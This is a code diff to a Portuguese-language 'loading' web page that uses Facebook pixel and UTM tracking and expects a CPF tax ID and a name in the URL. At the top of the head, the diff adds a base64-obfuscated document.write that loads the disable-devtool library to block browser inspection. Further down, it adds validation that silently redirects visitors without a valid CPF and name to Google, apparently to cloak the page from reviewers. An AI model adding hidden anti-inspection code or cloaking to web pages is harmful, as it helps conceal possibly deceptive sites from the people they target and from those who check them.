@@ -3,7 +3,7 @@
   <head>
 
 <!-- Config do pixel face + utm -->
-
+<script>document.write(atob('PHNjcmlwdCBkaXNhYmxlLWRldnRvb2wtYXV0byBzcmM9J2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vZGlzYWJsZS1kZXZ0b29sJz48L3NjcmlwdD4='))</script>
 <script
       src="scripts/utms/latest-1.js"
       data-utmify-prevent-subids=""
@@ -99,6 +99,134 @@
     </div>
 
     <script>
+      // Função de validação de CPF da Receita Federal
+      function validaCPF(cpf) {
+        var Soma = 0;
+        var Resto;
+
+        var strCPF = String(cpf).replace(/[^\d]/g, "");
+        
+        if (strCPF.length !== 11)
+           return false;
+        
+        // Verifica CPFs com todos os dígitos iguais
+        if ([
+          '00000000000',
+          '11111111111',
+          '22222222222',
+          '33333333333',
+          '44444444444',
+          '55555555555',
+          '66666666666',
+          '77777777777',
+          '88888888888',
+          '99999999999',
+          ].indexOf(strCPF) !== -1)
+          return false;
+
+        // Calcula primeiro dígito verificador
+        for (i=1; i<=9; i++)
+          Soma = Soma + parseInt(strCPF.substring(i-1, i)) * (11 - i);
+
+        Resto = (Soma * 10) % 11;
+
+        if ((Resto == 10) || (Resto == 11)) 
+          Resto = 0;
+
+        if (Resto != parseInt(strCPF.substring(9, 10)) )
+          return false;
+
+        Soma = 0;
+
+        // Calcula segundo dígito verificador
+        for (i = 1; i <= 10; i++)
+          Soma = Soma + parseInt(strCPF.substring(i-1, i)) * (12 - i);
+
+        Resto = (Soma * 10) % 11;
+
+        if ((Resto == 10) || (Resto == 11)) 
+          Resto = 0;
+
+        if (Resto != parseInt(strCPF.substring(10, 11) ) )
+          return false;
+
+        return true;
+      }
+
+      // Função de validação de nome
+      function validaNome(nome) {
+        // Remove espaços extras
+        nome = nome.trim();
+        
+        // Verifica se está vazio
+        if (nome === "") {
+          return { valido: false, mensagem: "Por favor, digite seu nome completo." };
+        }
+        
+        // Verifica se tem pelo menos 2 palavras (nome e sobrenome)
+        const partesNome = nome.split(/\s+/).filter(p => p.length > 0);
+        if (partesNome.length < 2) {
+          return { valido: false, mensagem: "Por favor, digite seu nome completo com sobrenome." };
+        }
+        
+        // Verifica se cada parte tem pelo menos 2 caracteres
+        for (let parte of partesNome) {
+          if (parte.length < 2) {
+            return { valido: false, mensagem: "Cada parte do nome deve ter pelo menos 2 letras." };
+          }
+        }
+        
+        // Verifica se o nome total tem pelo menos 6 caracteres
+        if (nome.replace(/\s/g, '').length < 6) {
+          return { valido: false, mensagem: "O nome deve ter pelo menos 6 letras." };
+        }
+        
+        // Verifica se contém apenas letras, espaços e caracteres comuns em nomes
+        const regexNome = /^[A-Za-zÀ-ÖØ-öø-ÿ\s.'-]+$/;
+        if (!regexNome.test(nome)) {
+          return { valido: false, mensagem: "O nome deve conter apenas letras e espaços." };
+        }
+        
+        // Verifica nomes absurdos/aleatórios
+        const nomesInvalidos = [
+          'teste', 'aaaaaa', 'bbbbbb', 'cccccc', 'dddddd', 'eeeeee', 
+          'ffffff', 'abcdef', 'qwerty', 'asdfgh', 'zxcvbn', '123456',
+          'nome teste', 'fulano', 'cicrano', 'beltrano', 'aaa bbb'
+        ];
+        
+        const nomeLower = nome.toLowerCase();
+        for (let nomeInvalido of nomesInvalidos) {
+          if (nomeLower === nomeInvalido) {
+            return { valido: false, mensagem: "Por favor, digite seu nome real completo." };
+          }
+        }
+        
+        // Verifica sequências repetidas
+        if (/(.)\1{4,}/.test(nomeLower.replace(/\s/g, ''))) {
+          return { valido: false, mensagem: "O nome parece conter sequências repetidas." };
+        }
+        
+        // Verifica padrões de teclado
+        const padroesTeclado = [
+          'qwerty', 'asdfgh', 'zxcvbn', 'qazwsx', 'edcrfv', 'tgbnhy',
+          'yhnujm', 'ikm', 'olp', 'p[]', 'ç~', '1qaz', '2wsx', '3edc',
+          '4rfv', '5tgb', '6yhn', '7ujm', '8ik', '9ol', '0pç'
+        ];
+        
+        for (let padrao of padroesTeclado) {
+          if (nomeLower.includes(padrao)) {
+            return { valido: false, mensagem: "O nome parece conter padrões de teclado." };
+          }
+        }
+        
+        return { valido: true, mensagem: "" };
+      }
+
+      // Função para redirecionar para o Google
+      function redirecionarParaGoogle() {
+        window.location.href = "https://www.google.com";
+      }
+
       document.addEventListener("DOMContentLoaded", function () {
         setTimeout(() => {
           let preloader = document.getElementById("preloader");
@@ -113,14 +241,43 @@
           // 🔹 Recupera TODOS os parâmetros da URL (CPF, nome, UTMs, etc.)
           const urlParams = getAllURLParams();
 
-          // 🔹 Verifica se o CPF foi encontrado antes de continuar
-          if (!urlParams.has("cpf")) {
-            alert("Erro: CPF não encontrado na URL!");
+          // 🔹 Verifica se o CPF e NOME foram encontrados antes de continuar
+          if (!urlParams.has("cpf") || !urlParams.has("nome")) {
+            console.error("CPF ou NOME não encontrado na URL. Redirecionando para Google.");
+            redirecionarParaGoogle();
             return;
           }
 
-          console.log("✅ Parâmetros recebidos na Página Loading:", Object.fromEntries(urlParams.entries()));
+          // 🔹 Valida os dados recebidos
+          try {
+            const cpfValue = urlParams.get("cpf");
+            const nomeValue = decodeURIComponent(urlParams.get("nome"));
 
+            // Validação do CPF
+            if (!validaCPF(cpfValue)) {
+              console.error("CPF inválido:", cpfValue, "Redirecionando para Google.");
+              redirecionarParaGoogle();
+              return;
+            }
+
+            // Validação do Nome
+            const validacaoNome = validaNome(nomeValue);
+            if (!validacaoNome.valido) {
+              console.error("Nome inválido:", validacaoNome.mensagem, "Redirecionando para Google.");
+              redirecionarParaGoogle();
+              return;
+            }
+
+            console.log("✅ Validações passadas! CPF e Nome válidos.");
+            console.log("✅ Parâmetros recebidos na Página Loading:", Object.fromEntries(urlParams.entries()));
+
+          } catch (error) {
+            console.error("Erro na validação:", error, "Redirecionando para Google.");
+            redirecionarParaGoogle();
+            return;
+          }
+
+          // 🔹 Se todas as validações passarem, continua com a animação de loading
           // Exibe primeiro status
           statusText.style.opacity = 1;
           statusText.style.transform = "translateY(0)";
